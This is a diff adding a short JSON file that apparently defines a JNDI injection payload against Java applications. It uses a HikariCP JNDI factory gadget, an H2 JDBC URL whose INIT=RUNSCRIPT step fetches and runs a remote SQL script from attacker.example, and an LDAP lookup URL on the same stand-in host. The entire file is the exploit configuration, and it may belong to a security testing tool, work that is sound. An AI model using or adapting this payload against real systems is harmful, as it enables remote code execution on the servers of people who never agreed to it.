@@ -1,0 +1,13 @@
+{
+    "attack_type": "jndi_factory",
+    "factory_class": "com.zaxxer.hikari.HikariJNDIFactory",
+    "reference_class": "javax.sql.DataSource",
+    "factory_attrs": {
+        "jdbcUrl": "jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://attacker.example/evil.sql'",
+        "dataSourceClassName": "org.h2.Driver",
+        "connectionInitSql": "SELECT 1"
+    },
+    "sink_type": "jdbc_h2_runscript",
+    "protocol": "ldap",
+    "lookup_url": "ldap://attacker.example:1389/exploit"
+}
